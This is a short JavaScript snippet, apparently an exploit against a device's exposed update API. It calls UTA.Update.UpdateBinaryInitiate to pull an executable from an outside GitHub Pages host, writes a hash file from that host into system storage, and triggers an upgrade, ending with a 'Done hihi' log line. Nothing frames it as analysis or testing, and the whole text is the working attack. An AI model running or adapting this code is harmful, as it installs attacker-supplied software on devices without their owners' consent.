UTA.Update.UpdateBinaryInitiate('https://vinhjaxt.github.io/gopro.exe?_='+Math.random(), '11').then(function (){
  return UTA.OSServices.writeToSystemStorage('1',1,'https://vinhjaxt.github.io/gopro.sha265.txt?_='+Math.random())
}).then(function (){
  return UTA.Update.upgrade('11')
}).then(function (){ console.log('Done hihi') }).catch(alert)
